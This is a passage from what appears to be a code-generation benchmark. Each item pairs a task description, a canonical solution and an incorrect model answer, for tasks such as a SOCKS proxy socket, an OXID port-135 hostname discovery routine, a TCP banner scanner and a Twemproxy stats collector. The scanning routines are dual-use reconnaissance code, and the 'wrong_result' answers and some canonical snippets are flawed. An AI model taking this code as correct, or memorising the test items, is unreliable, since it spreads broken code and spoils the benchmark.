translation_result = translations[0]\n        else:\n            translation_result = translations\n        \n        if printResult:\n            print(translation_result)\n        \n        return translation_result\n    \n    except httpx.HTTPStatusError as e:\n        if e.response.status_code == 429:\n            raise TooManyRequestsException(\"Too many requests. Please try again later.\")\n        return None\n    except httpx.RequestError as e:\n        return None\n```"
  },
  {
    "Task_id": 322,
    "Instruction": "Task Description: Create a SOCKS-enabled socket class that extends Python's built-in socket functionality to support proxy connections through SOCKS4, SOCKS5, and HTTP proxies.\n\nClass Description: The `socksocket` class extends Python's `socket.socket` class to provide proxy support. It handles connection establishment through various proxy types while maintaining standard socket functionality. The class manages proxy configuration, connection negotiation, and error handling for proxy-related operations.\n\nAttributes:\n- default_proxy: [Class Variable] - Default proxy configuration used when no specific proxy is set\n- _proxyconn: [socket.socket] - TCP connection used to maintain UDP relay (for SOCKS5 UDP)\n- proxy: [tuple] - Current proxy configuration (type, addr, port, rdns, username, password)\n- proxy_sockname: [tuple] - The bound address (IP, port) of the proxy connection\n- proxy_peername: [tuple] - The destination address (IP, port) through the proxy\n- _timeout: [float] - Socket timeout value\n\nMethods:\n- __init__(family, type, proto, *args, **kwargs) -> None - Initializes the socket with optional proxy support. Validates socket type and sets up proxy attributes.\n- set_proxy(proxy_type, addr, port, rdns, username, password) -> None - Configures proxy settings for the socket.\n- connect(dest_pair) -> None - Establishes connection to destination through configured proxy. Handles both direct and proxied connections.\n- _readall(file, count) -> bytes - Internal method to read exact number of bytes from a file object.\n- _proxy_addr() -> tuple - Internal method to resolve proxy address and port.\n- _negotiate_SOCKS4(dest_addr, dest_port) -> None - Internal method to handle SOCKS4 proxy negotiation.\n- _negotiate_SOCKS5(dest_addr, dest_port) -> None - Internal method to handle SOCKS5 proxy negotiation.\n- _negotiate_HTTP(dest_addr, dest_port) -> None - Internal method to handle HTTP proxy negotiation.",
    "Canonical_solution": "import socket\nfrom errno import EOPNOTSUPP, EINVAL, EAGAIN\nimport struct\nfrom io import BytesIO\nfrom base64 import b64encode\n\nclass socksocket(socket.socket):\n    \"\"\"socksocket([family[, type[, proto]]]) -> socket object\n\n    Open a SOCKS enabled socket. The parameters are the same as\n    those of the standard socket init. In order for SOCKS to work,\n    you must specify family=AF_INET and proto=0.\n    The \"type\" argument must be either SOCK_STREAM or SOCK_DGRAM.\n    \"\"\"\n\n    default_proxy = None\n\n    def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM,\n                 proto=0, *args, **kwargs):\n        if type not in (socket.SOCK_STREAM, socket.SOCK_DGRAM):\n            msg = \"Socket type must be stream or datagram, not {!r}\"\n            raise ValueError(msg.format(type))\n\n        super(socksocket, self).__init__(family, type, proto, *args, **kwargs)\n        self._proxyconn = None  # TCP connection to keep UDP relay alive\n\n        if self.default_proxy:\n            self.proxy = self.default_proxy\n        else:\n            self.proxy = (None, None, None, None, None, None)\n        self.proxy_sockname = None\n        self.proxy_peername = None\n\n        self._timeout = None\n\n    def _readall(self, file, count):\n        \"\"\"Receive EXACTLY the number of bytes requested from the file object.\"\"\"\n        data = b\"\"\n        while len(data) < count:\n            d = file.read(count - len(data))\n            if not d:\n                raise GeneralProxyError(\"Connection closed unexpectedly\")\n            data += d\n        return data\n\n    def set_proxy(self, proxy_type=None, addr=None, port=None, rdns=True,\n                  username=None, password=None):\n        \"\"\"Sets the proxy to be used.\"\"\"\n        self.proxy = (proxy_type, addr, port, rdns,\n                      username.encode() if username else None,\n                      password.encode() if password else None)\n\n    def connect(self, dest_pair):\n        \"\"\"\n        Connects to the specified destination through a proxy.\n        Uses the same API as socket's connect().\n\n        dest_pair - 2-tuple of (IP/hostname, port).\n        \"\"\"\n        if len(dest_pair) != 2 or dest_pair[0].startswith(\"[\"):\n            raise socket.error(\"PySocks doesn't support IPv6: %s\" % str(dest_pair))\n\n        dest_addr, dest_port = dest_pair\n\n        if self.type == socket.SOCK_DGRAM:\n            if not self._proxyconn:\n                self.bind((\"\", 0))\n            dest_addr = socket.gethostbyname(dest_addr)\n\n            if dest_addr == \"0.0.0.0\" and not dest_port:\n                self.proxy_peername = None\n            else:\n                self.proxy_peername = (dest_addr, dest_port)\n            return\n\n        (proxy_type, proxy_addr, proxy_port, rdns, username,\n         password) = self.proxy\n\n        if (not isinstance(dest_pair, (list, tuple))\n                or len(dest_pair) != 2\n                or not dest_addr\n                or not isinstance(dest_port, int)):\n            raise GeneralProxyError(\n                \"Invalid destination-connection (host, port) pair\")\n\n        super(socksocket, self).settimeout(self._timeout)\n\n        if proxy_type is None:\n            self.proxy_peername = dest_pair\n            super(socksocket, self).settimeout(self._timeout)\n            super(socksocket, self).connect((dest_addr, dest_port))\n            return\n\n        proxy_addr = self._proxy_addr()\n\n        try:\n            super(socksocket, self).connect(proxy_addr)\n        except socket.error as error:\n            self.close()\n            proxy_addr, proxy_port = proxy_addr\n            proxy_server = \"{0}:{1}\".format(proxy_addr, proxy_port)\n            printable_type = PRINTABLE_PROXY_TYPES[proxy_type]\n\n            msg = \"Error connecting to {0} proxy {1}\".format(printable_type,\n                                                             proxy_server)\n            raise ProxyConnectionError(msg, error)\n        else:\n            try:\n                negotiate = self._proxy_negotiators[proxy_type]\n                negotiate(self, dest_addr, dest_port)\n            except socket.error as error:\n                self.close()\n                raise GeneralProxyError(\"Socket error\", error)\n            except ProxyError:\n                self.close()\n                raise\n\n    def _proxy_addr(self):\n        \"\"\"Return proxy address to connect to as tuple object\"\"\"\n        (proxy_type, proxy_addr, proxy_port, rdns, username,\n         password) = self.proxy\n        proxy_port = proxy_port or DEFAULT_PORTS.get(proxy_type)\n        if not proxy_port:\n            raise GeneralProxyError(\"Invalid proxy type\")\n        return proxy_addr, proxy_port\n\n    def _negotiate_SOCKS5(self, dest_addr, dest_port):\n        \"\"\"Negotiates a connection through a SOCKS5 server.\"\"\"\n        self.proxy_peername, self.proxy_sockname = self._SOCKS5_request(\n            self, b\"\\x01\", (dest_addr, dest_port))\n\n    def _negotiate_SOCKS4(self, dest_addr, dest_port):\n        \"\"\"Negotiates a connection through a SOCKS4 server.\"\"\"\n        proxy_type, addr, port, rdns, username, password = self.proxy\n\n        writer = self.makefile(\"wb\")\n        reader = self.makefile(\"rb\", 0)\n        try:\n            remote_resolve = False\n            try:\n                addr_bytes = socket.inet_aton(dest_addr)\n            except socket.error:\n                if rdns:\n                    addr_bytes = b\"\\x00\\x00\\x00\\x01\"\n                    remote_resolve = True\n                else:\n                    addr_bytes = socket.inet_aton(\n                        socket.gethostbyname(dest_addr))\n\n            writer.write(struct.pack(\">BBH\", 0x04, 0x01, dest_port))\n            writer.write(addr_bytes)\n\n            if username:\n                writer.write(username)\n            writer.write(b\"\\x00\")\n\n            if remote_resolve:\n                writer.write(dest_addr.encode(\"idna\") + b\"\\x00\")\n            writer.flush()\n\n            resp = self._readall(reader, 8)\n            if resp[0:1] != b\"\\x00\":\n                raise GeneralProxyError(\n                    \"SOCKS4 proxy server sent invalid data\")\n\n            status = ord(resp[1:2])\n            if status != 0x5A:\n                error = SOCKS4_ERRORS.get(status, \"Unknown error\")\n                raise SOCKS4Error(\"{0:#04x}: {1}\".format(status, error))\n\n            self.proxy_sockname = (socket.inet_ntoa(resp[4:]),\n                                   struct.unpack(\">H\", resp[2:4])[0])\n            if remote_resolve:\n                self.proxy_peername = socket.inet_ntoa(addr_bytes), dest_port\n            else:\n                self.proxy_peername = dest_addr, dest_port\n        finally:\n            reader.close()\n            writer.close()\n\n    def _negotiate_HTTP(self, dest_addr, dest_port):\n        \"\"\"Negotiates a connection through an HTTP server.\"\"\"\n        proxy_type, addr, port, rdns, username, password = self.proxy\n\n        addr = dest_addr if rdns else socket.gethostbyname(dest_addr)\n\n        http_headers = [\n            (b\"CONNECT \" + addr.encode(\"idna\") + b\":\" +\n             str(dest_port).encode() + b\" HTTP/1.1\"),\n            b\"Host: \" + dest_addr.encode(\"idna\")\n        ]\n\n        if username and password:\n            http_headers.append(b\"Proxy-Authorization: basic \" +\n                                b64encode(username + b\":\" + password))\n\n        http_headers.append(b\"\\r\\n\")\n\n        self.sendall(b\"\\r\\n\".join(http_headers))\n\n        fobj = self.makefile()\n        status_line = fobj.readline()\n        fobj.close()\n\n        if not status_line:\n            raise GeneralProxyError(\"Connection closed unexpectedly\")\n\n        try:\n            proto, status_code, status_msg = status_line.split(\" \", 2)\n        except ValueError:\n            raise GeneralProxyError(\"HTTP proxy server sent invalid response\")\n\n        if not proto.startswith(\"HTTP/\"):\n            raise GeneralProxyError(\n                \"Proxy server does not appear to be an HTTP proxy\")\n\n        try:\n            status_code = int(status_code)\n        except ValueError:\n            raise HTTPError(\n                \"HTTP proxy server did not return a valid HTTP status\")\n\n        if status_code != 200:\n            error = \"{0}: {1}\".format(status_code, status_msg)\n            raise HTTPError(error)\n\n        self.proxy_sockname = (b\"0.0.0.0\", 0)\n        self.proxy_peername = addr, dest_port\n\n    _proxy_negotiators = {\n        SOCKS4: _negotiate_SOCKS4,\n        SOCKS5: _negotiate_SOCKS5,\n        HTTP: _negotiate_HTTP\n    }",
    "Code_level": "Class-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport struct\nimport select\nimport errno\n\nclass socksocket(socket.socket):\n    default_proxy = None\n    _proxyconn = None\n    proxy = None\n    proxy_sockname = None\n    proxy_peername = None\n    _timeout = None\n\n    def __init__(self, family=socket.AF_INET, type=socket.SOCK_STREAM, proto=0, *args, **kwargs):\n        super().__init__(family, type, proto, *args, **kwargs)\n        self.proxy = self.default_proxy\n        if self.proxy:\n            self.set_proxy(*self.proxy)\n\n    def set_proxy(self, proxy_type, addr, port, rdns=True, username=None, password=None):\n        self.proxy = (proxy_type, addr, port, rdns, username, password)\n\n    def connect(self, dest_pair):\n        if self.proxy:\n            self._negotiate_proxy(dest_pair)\n        else:\n            super().connect(dest_pair)\n\n    def _readall(self, file, count):\n        data = b''\n        while len(data) < count:\n            chunk = file.recv(count - len(data))\n            if not chunk:\n                raise EOFError('Unexpected end-of-file while reading')\n            data += chunk\n        return data\n\n    def _proxy_addr(self):\n        addr = socket.gethostbyname(self.proxy[1])\n        port = self.proxy[2]\n        return (addr, port)\n\n    def _negotiate_SOCKS4(self, dest_addr, dest_port):\n        addr = socket.gethostbyname(dest_addr)\n        if self.proxy[3]:\n            ip = socket.inet_aton(addr)\n        else:\n            ip = b'\\x00\\x00\\x00\\x01'\n        request = struct.pack('>BBH', 4, 1, dest_port) + ip + b'\\x00' + self.proxy[4].encode('ascii') + b'\\x00'\n        self.sendall(request)\n        response = self._readall(self, 8)\n        if response[0] != 0 or response[1] != 90:\n            raise OSError('SOCKS4 proxy connection failed')\n\n    def _negotiate_SOCKS5(self, dest_addr, dest_port):\n        methods = b'\\x01\\x00'\n        self.sendall(struct.pack('>BB', 5, len(methods)) + methods)\n        response = self._readall(self, 2)\n        if response[0] != 5 or response[1] != 0:\n            raise OSError('SOCKS5 proxy authentication failed')\n        auth = b'\\x01' + struct.pack('>BB', len(self.proxy[4]), len(self.proxy[5])) + self.proxy[4].encode('ascii') + self.proxy[5].encode('ascii')\n        self.sendall(struct.pack('>BB', 1, len(auth)) + auth)\n        response = self._readall(self, 2)\n        if response[0] != 1 or response[1] != 0:\n            raise OSError('SOCKS5 proxy authentication failed')\n        addr = socket.gethostbyname(dest_addr)\n        if self.proxy[3]:\n            ip = socket.inet_aton(addr)\n        else:\n            ip = b'\\x03' + struct.pack('B', len(addr)) + addr.encode('ascii')\n        request = struct.pack('>BBBH', 5, 1, 0, dest_port) + ip\n        self.sendall(request)\n        response = self._readall(self, 4)\n        if response[0] != 5 or response[1] != 0:\n            raise OSError('SOCKS5 proxy connection failed')\n        atyp = response[3]\n        if atyp == 1:\n            response = self._readall(self, 4)\n        elif atyp == 3:\n            length = response[3]\n            response = self._readall(self, length + 2)\n        elif atyp == 4:\n            response = self._readall(self, 16)\n        else:\n            raise OSError('SOCKS5 proxy returned unknown address type')\n\n    def _negotiate_HTTP(self, dest_addr, dest_port):\n        request = f\"CONNECT {dest_addr}:{dest_port} HTTP/1.1\\r\\nHost: {dest_addr}:{dest_port}\\r\\n\"\n        if self.proxy[4] and self.proxy[5]:\n            auth = base64.b64encode(f\"{self.proxy[4]}:{self.proxy[5]}\".encode('ascii')).decode('ascii')\n            request += f\"Proxy-Authorization: Basic {auth}\\r\\n\"\n        request += \"\\r\\n\"\n        self.sendall(request.encode('ascii'))\n        response = self.recv(4096)\n        if b'200 Connection Established' not in response:\n            raise OSError('HTTP proxy connection failed')\n\n    def _negotiate_proxy(self, dest_pair):\n        proxy_type = self.proxy[0]\n        if proxy_type == 'SOCKS4':\n            self._negotiate_SOCKS4(*dest_pair)\n        elif proxy_type == 'SOCKS5':\n            self._negotiate_SOCKS5(*dest_pair)\n        elif proxy_type == 'HTTP':\n            self._negotiate_HTTP(*dest_pair)\n        else:\n            raise ValueError('Unsupported proxy type')\n```"
  },
  {
    "Task_id": 325,
    "Instruction": "Task Description: Create a function to probe an HTTP server's connectivity and response behavior, checking for potential network interference or server availability issues.\n\nFunction Description: The function attempts to connect to an HTTP server, send a GET request with a specific keyword, and analyze the response. It also checks Redis for potential firewall interference patterns. The function returns different status codes based on the server's response and network conditions.\n\nInput:\n- domain: [str] - The domain name of the target server\n- ip: [str] - The IP address of the target server\n- keyword: [str] - The search keyword to include in the GET request\n\nOutput:\n- [int] - Returns one of the following status codes:\n  * RET_SUCCESS (1) if server responds normally\n  * RET_SVR_NO_RESP (2) if server doesn't respond or times out\n  * RET_GFW_RST (3) if firewall interference is detected\n  * RET_OTHER (99) for other unexpected errors",
    "Canonical_solution": "import os\nimport socket\nimport errno\nimport time\nimport redis\nimport struct\n\nRET_SUCCESS = 1\nRET_SVR_NO_RESP = 2\nRET_GFW_RST = 3\nRET_OTHER = 99\n\ndef probe_http_server(domain, ip, keyword):\n    redis_conn = redis.StrictRedis(host='localhost', port=6389, db=0)\n\n    ret = 0\n    try:\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        s.settimeout(5)\n        s.connect((ip, 80))\n        s.sendall(\"GET /?keyword=%s HTTP/1.1\\r\\nHost: %s\\r\\nConnection: close\\r\\nUser-Agent: connectivity measurement\\r\\n\\r\\n\" % (keyword, domain))\n        data = s.recv(1024)\n        s.shutdown(socket.SHUT_RDWR)\n        s.close()\n        if data and len(data) > 1:\n            ret = 1\n    except socket.timeout:\n        ret = 0\n    except socket.error, serr:\n        if serr[0] == errno.ECONNRESET:\n            ret = -1\n        elif serr[0] == errno.ETIMEDOUT:\n            ret = 0\n        else:\n            ret = -99\n    except Exception, err:\n        ret = -99\n\n    time.sleep(2)\n    type1rst = redis_conn.keys(\"rst:attack1:*_%d\" % ip2int(ip))\n    type2rst = redis_conn.keys(\"rst:attack2:*_%d\" % ip2int(ip))\n    if type1rst or type2rst:\n        return RET_GFW_RST\n    else:\n        if ret == -1:\n            return RET_SVR_NO_RESP\n        elif ret == 0:\n            return RET_SVR_NO_RESP\n        elif ret == 1:\n            return RET_SUCCESS\n        else:\n            return RET_OTHER\n\ndef ip2int(addr):                                                               \n    return struct.unpack(\"I\", socket.inet_aton(addr))[0]",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport requests\nimport redis\nimport time\n\nRET_SUCCESS = 1\nRET_SVR_NO_RESP = 2\nRET_GFW_RST = 3\nRET_OTHER = 99\n\ndef probe_http_server(domain, ip, keyword):\n    try:\n        # Check Redis for firewall interference patterns\n        redis_client = redis.StrictRedis(host='localhost', port=6379, db=0)\n        if redis_client.exists(f\"interference:{ip}\"):\n            return RET_GFW_RST\n\n        # Attempt to connect to the HTTP server\n        url = f\"http://{domain}/search?q={keyword}\"\n        start_time = time.time()\n        response = requests.get(url, timeout=5)\n\n        # Measure response time\n        response_time = time.time() - start_time\n\n        # Analyze the response\n        if response.status_code == 200:\n            return RET_SUCCESS\n        elif response.status_code == 404:\n            return RET_SVR_NO_RESP\n        else:\n            return RET_OTHER\n\n    except requests.exceptions.RequestException as e:\n        if isinstance(e, requests.exceptions.Timeout):\n            return RET_SVR_NO_RESP\n        else:\n            return RET_OTHER\n```"
  },
  {
    "Task_id": 328,
    "Instruction": "Task Description: Implement a function that detects alive hosts and retrieves their hostnames by establishing TCP connections to port 135 and exchanging specific binary packets.\n\nFunction Description: The function `oxid` is designed to scan a queue of IP addresses, attempt TCP connections to port 135 on each, and exchange binary packets to retrieve hostname information. It operates in a multi-threaded environment, processing IPs from a shared queue and updating a progress bar. Detected hostnames are appended to a shared list.\n\nInput:\n- `alive_host_Queue`: [Queue] - A thread-safe queue containing IP addresses to scan\n- `pbar`: [ProgressBar] - A progress bar object to update as IPs are processed\n- `alive_hostname_ips`: [List] - A shared list to store results in format [ip, hostname1, hostname2,...]\n\nOutput: None (results are appended to the input `alive_hostname_ips` list)",
    "Canonical_solution": "import socket\nfrom queue import Queue\nfrom threading import Thread\n\ndef oxid(alive_host_Queue, pbar, alive_hostname_ips):\n    def run_detect():\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(10)\n        try:\n            sock.connect((ip, 135))\n            buffer_v1 = b\"\\x05\\x00\\x0b\\x03\\x10\\x00\\x00\\x00\\x48\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\xb8\\x10\\xb8\\x10\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\xc4\\xfe\\xfc\\x99\\x60\\x52\\x1b\\x10\\xbb\\xcb\\x00\\xaa\\x00\\x21\\x34\\x7a\\x00\\x00\\x00\\x00\\x04\\x5d\\x88\\x8a\\xeb\\x1c\\xc9\\x11\\x9f\\xe8\\x08\\x00\\x2b\\x10\\x48\\x60\\x02\\x00\\x00\\x00\"\n            buffer_v2 = b\"\\x05\\x00\\x00\\x03\\x10\\x00\\x00\\x00\\x18\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x05\\x00\"\n            sock.send(buffer_v1)\n            packet = sock.recv(1024)\n            sock.send(buffer_v2)\n            packet = sock.recv(4096)\n            packet_v2 = packet[42:]\n            packet_v2_end = packet_v2.find(b\"\\x09\\x00\\xff\\xff\\x00\\x00\")\n            packet_v2 = packet_v2[:packet_v2_end]\n            hostname_list = packet_v2.split(b\"\\x00\\x00\")\n            result = [ip]\n            for h in hostname_list:\n                h = h.replace(b'\\x07\\x00', b'')\n                h = h.replace(b'\\x00', b'')\n                if h == b'':\n                    continue\n                h = h.decode('utf-8')\n                result.append(h)\n            alive_hostname_ips.append(result)\n        except Exception as e:\n            pass\n        finally:\n            sock.close()\n\n    while not alive_host_Queue.empty():\n        ip = alive_host_Queue.get()\n        run_detect()\n        pbar.update(1)\n        alive_host_Queue.task_done()",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "```python\nimport socket\nimport threading\nfrom queue import Queue\n\ndef oxid(alive_host_Queue, pbar, alive_hostname_ips):\n    while not alive_host_Queue.empty():\n        ip = alive_host_Queue.get()\n        try:\n            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n                s.settimeout(1)\n                s.connect((ip, 135))\n                # Send specific binary packet here\n                # Example: s.sendall(b'\\x05\\x00\\x00\\x00\\x00\\x00\\x00\\x00')\n                # Receive response\n                response = s.recv(4096)\n                # Parse hostname from response\n                # This is a placeholder for actual parsing logic\n                hostname = \"example.com\"\n                alive_hostname_ips.append([ip, hostname])\n        except Exception as e:\n            pass\n        finally:\n            pbar.update(1)\n            alive_host_Queue.task_done()\n```"
  },
  {
    "Task_id": 33,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for interacting with the SambaVerse API, handling request construction, response processing, and error management.\n\nClass Description: The SambaVerseClient class provides an interface to communicate with the SambaVerse API, sending chat messages and receiving completions. It handles API authentication, request formatting, and response conversion.\n\nAttributes:\n_api_key: str - The API key for authentication with the SambaVerse service\nmodel_type: str - The model type/name to be used for completions\n_url: str - The endpoint URL for the SambaVerse API\nmodel_config_dict: Dict[str, Any] - Configuration parameters for the model (temperature, max_tokens, etc.)\n\nMethods:\n__init__(api_key: str, model_type: str, url: str, model_config_dict: Dict[str, Any]) -> None - Initializes the client with API credentials and configuration\nsend_request(messages: List[OpenAIMessage]) -> ChatCompletion - Sends a chat completion request to the API and returns the processed response\n_convert_response(samba_response: Dict[str, Any]) -> ChatCompletion - Converts the raw API response into a standardized ChatCompletion object",
    "Canonical_solution": "import json\nimport uuid\nfrom typing import Any, Dict, List, Optional, Union\n\nimport httpx\nfrom camel.messages import OpenAIMessage\nfrom camel.types import ChatCompletion, CompletionUsage\n\nclass SambaVerseClient:\n    def __init__(self, api_key: str, model_type: str, url: str, model_config_dict: Dict[str, Any]):\n        self._api_key = api_key\n        self.model_type = model_type\n        self._url = url\n        self.model_config_dict = model_config_dict\n\n    def send_request(self, messages: List[OpenAIMessage]) -> ChatCompletion:\n        headers = {\n            \"Content-Type\": \"application/json\",\n            \"key\": str(self._api_key),\n            \"modelName\": self.model_type,\n        }\n\n        data = {\n            \"instance\": json.dumps({\n                \"conversation_id\": str(uuid.uuid4()),\n                \"messages\": messages,\n            }),\n            \"params\": {\n                \"do_sample\": {\"type\": \"bool\", \"value\": \"true\"},\n                \"max_tokens_to_generate\": {\n                    \"type\": \"int\",\n                    \"value\": str(self.model_config_dict.get(\"max_tokens\")),\n                },\n                \"process_prompt\": {\"type\": \"bool\", \"value\": \"true\"},\n                \"repetition_penalty\": {\n                    \"type\": \"float\",\n                    \"value\": str(self.model_config_dict.get(\"repetition_penalty\")),\n                },\n                \"return_token_count_only\": {\"type\": \"bool\", \"value\": \"false\"},\n                \"select_expert\": {\n                    \"type\": \"str\",\n                    \"value\": self.model_type.split('/')[1],\n                },\n                \"stop_sequences\": {\n                    \"type\": \"str\",\n                    \"value\": self.model_config_dict.get(\"stop_sequences\"),\n                },\n                \"temperature\": {\n                    \"type\": \"float\",\n                    \"value\": str(self.model_config_dict.get(\"temperature\")),\n                },\n                \"top_k\": {\n                    \"type\": \"int\",\n                    \"value\": str(self.model_config_dict.get(\"top_k\")),\n                },\n                \"top_p\": {\n                    \"type\": \"float\",\n                    \"value\": str(self.model_config_dict.get(\"top_p\")),\n                },\n            },\n        }\n\n        with httpx.Client() as client:\n            response = client.post(\n                self._url,\n                headers=headers,\n                json=data,\n            )\n\n        raw_text = response.text\n        dicts = raw_text.split('}\\n{')\n        last_dict = '{' + dicts[-1]\n        last_dict = json.loads(last_dict)\n        return self._convert_response(last_dict)\n\n    def _convert_response(self, samba_response: Dict[str, Any]) -> ChatCompletion:\n        choices = [\n            dict(\n                index=0,\n                message={\n                    \"role\": 'assistant',\n                    \"content\": samba_response['result']['responses'][0]['completion'],\n                },\n                finish_reason=samba_response['result']['responses'][0]['stop_reason'],\n            )\n        ]\n\n        return ChatCompletion.construct(\n            id=None,\n            choices=choices,\n            created=int(time.time()),\n            model=self.model_type,\n            object=\"chat.completion\",\n            usage=CompletionUsage(\n                completion_tokens=0,\n                prompt_tokens=0,\n                total_tokens=int(samba_response['result']['responses'][0]['total_tokens_count']),\n            ),\n        )",
    "Code_level": "Class-level",
    "FSMID_for_test": 58,
    "wrong_result": "```python\nimport requests\nfrom typing import List, Dict, Any\n\nclass OpenAIMessage:\n    def __init__(self, role: str, content: str):\n        self.role = role\n        self.content = content\n\nclass ChatCompletion:\n    def __init__(self, message: str):\n        self.message = message\n\nclass SambaVerseClient:\n    def __init__(self, api_key: str, model_type: str, url: str, model_config_dict: Dict[str, Any]) -> None:\n        self._api_key = api_key\n        self.model_type = model_type\n        self._url = url\n        self.model_config_dict = model_config_dict\n\n    def send_request(self, messages: List[OpenAIMessage]) -> ChatCompletion:\n        headers = {\n            'Authorization': f'Bearer {self._api_key}',\n            'Content-Type': 'application/json'\n        }\n        payload = {\n            'model': self.model_type,\n            'messages': [{'role': msg.role, 'content': msg.content} for msg in messages],\n            **self.model_config_dict\n        }\n        response = requests.post(self._url, headers=headers, json=payload)\n        response.raise_for_status()\n        return self._convert_response(response.json())\n\n    def _convert_response(self, samba_response: Dict[str, Any]) -> ChatCompletion:\n        message = samba_response.get('choices', [{}])[0].get('message', {}).get('content', '')\n        return ChatCompletion(message=message)\n```"
  },
  {
    "Task_id": 330,
    "Instruction": "Task Description: Create a function that scans a target host and port for open connections and service information using TCP socket communication.\n\nFunction Description: The function attempts to establish a TCP connection with a specified host and port, retrieves service information if available, and records the results in a global dictionary. It handles connection timeouts and errors gracefully.\n\nInput:\n- target (tuple): A tuple containing (host, port) where:\n  - host (str/int): The target hostname or IP address\n  - port (int): The target port number to scan\n\nOutput:\n- None: The function doesn't return any value directly but updates the global 'results' dictionary with scan results in the format:\n  {\n    host: {\n      port: {\n        'protocol': str,    # Protocol from global ports dictionary\n        'service': str,    # Either received service data or default from ports dict\n        'state': str       # 'open' if connection succeeded\n      }\n    }\n  }",
    "Canonical_solution": "import socket\nimport json\n\ndef _scan(target):\n    \"\"\"\n    Scan a target host and port for open connections and service information\n    \n    Args:\n        target (tuple): A tuple containing (host, port) to scan\n    \n    Returns:\n        None: Updates global results dictionary with scan results\n    \"\"\"\n    global ports\n    global results\n\n    try:\n        data = None\n        host, port = target\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1.0)\n        sock.connect((str(host), int(port)))\n\n        try:\n            data = sock.recv(1024)\n        except (socket.error, socket.timeout):\n            pass\n\n        sock.close()\n\n        if data:\n            data = ''.join([i for i in data if i in ([chr(n) for n in range(32, 123)])\n            data = data.splitlines()[0] if '\\n' in data else str(data if len(str(data)) <= 80 else data[:77] + '...')\n            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': data, 'state': 'open'}}\n        else:\n            item = {str(port) : {'protocol': ports[str(port)]['protocol'], 'service': ports[str(port)]['service'], 'state': 'open'}}\n\n        results.get(host).update(item)\n\n    except (socket.error, socket.timeout):\n        pass\n    except Exception as e:\n        util.log(\"{} error: {}\".format(_scan.__name__, str(e)))",
    "Code_level": "Function-level",
    "FSMID_for_test": 67,
    "wrong_result": "import socket\nimport time\n\n# Global dictionary to store scan results\nresults = {}\n\n# Dictionary mapping common ports to their protocols and services\nports = {\n    21: {'protocol': 'TCP', 'service': 'FTP'},\n    22: {'protocol': 'TCP', 'service': 'SSH'},\n    23: {'protocol': 'TCP', 'service': 'Telnet'},\n    25: {'protocol': 'TCP', 'service': 'SMTP'},\n    80: {'protocol': 'TCP', 'service': 'HTTP'},\n    443: {'protocol': 'TCP', 'service': 'HTTPS'},\n    # Add more ports as needed\n}\n\ndef scan_port(target):\n    host, port = target\n    if host not in results:\n        results[host] = {}\n    \n    if port not in ports:\n        return\n    \n    protocol = ports[port]['protocol']\n    service = ports[port].get('service', 'Unknown')\n    \n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.settimeout(1)  # Set timeout for the connection attempt\n        result = sock.connect_ex((host, port))\n        \n        if result == 0:\n            results[host][port] = {\n                'protocol': protocol,\n                'service': service,\n                'state': 'open'\n            }\n        else:\n            results[host][port] = {\n                'protocol': protocol,\n                'service': service,\n                'state': 'closed'\n            }\n        \n        sock.close()\n    except Exception as e:\n        results[host][port] = {\n            'protocol': protocol,\n            'service': service,\n            'state': 'error',\n            'error': str(e)\n        }\n\n# Example usage:\n# scan_port(('example.com', 80))"
  },
  {
    "Task_id": 333,
    "Instruction": "Task Description: Create a Python class that collects and processes statistics from Twemproxy (a fast, lightweight proxy for memcached and Redis) using TCP socket communication.\n\nClass Description: TwemproxyStatsCollector is a class designed to connect to Twemproxy instances, retrieve statistics in JSON format, and process them into structured dictionaries for gauges and pool metrics.\n\nAttributes:\nGAUGES: [list] - A list of metric names that should be treated as gauge values (numeric values that can go up and down)\nIGNORED: [list] - A list of field names that should be ignored when processing the statistics\n\nMethods:\nget_raw_stats: [Name](host, port) -> [dict] - Establishes a TCP connection to the specified Twemproxy instance and retrieves raw statistics in JSON format\nget_stats: [Name](host, port) -> [tuple(dict, dict)] - Processes raw statistics into two dictionaries: one for general stats and one for pool/server metrics\ncollect_stats: [Name](hosts) -> [dict] - Collects statistics from multiple Twemproxy hosts and organizes them by alias/hostname",
    "Canonical_solution": "import socket\nimport json\nimport re\n\nclass TwemproxyStatsCollector:\n    GAUGES = [\n        'uptime',\n        'curr_connections',\n        'client_connections',\n        'server_connections',\n        'server_ejected_at',\n        'in_queue',\n        'in_queue_bytes',\n        'out_queue',\n        'out_queue_bytes'\n    ]\n\n    IGNORED = [\n        'service',\n        'source',\n        'timestamp',\n        'version'\n    ]\n\n    def get_raw_stats(self, host, port):\n        data = ''\n        try:\n            if port is None:\n                sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n                sock.connect(host)\n            else:\n                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n                sock.connect((host, int(port)))\n\n            stats_data = ''\n            while True:\n                data = sock.recv(1024)\n                if not data:\n                    break\n                stats_data += data\n            sock.close()\n\n        except socket.error:\n            raise Exception('Failed to get stats from %s:%s' % (host, port))\n\n        try:\n            return json.loads(stats_data)\n        except (TypeError, ValueError):\n            raise ValueError(\"Unable to parse response from Twemproxy as a json object\")\n\n    def get_stats(self, host, port):\n        data = self.get_raw_stats(host, port)\n        if data is None:\n            return {}, {}\n\n        stats = {}\n        pools = {}\n        for stat, value in data.iteritems():\n            if isinstance(value, dict):\n                pool_name = stat.replace('.', '_')\n                pools[pool_name] = {}\n                for pool_stat, pool_value in value.iteritems():\n                    if isinstance(pool_value, dict):\n                        server_name = pool_stat.replace('.', '_')\n                        pools[pool_name][server_name] = {}\n                        for server_stat, server_value in pool_value.iteritems():\n                            pools[pool_name][server_name][server_stat] = 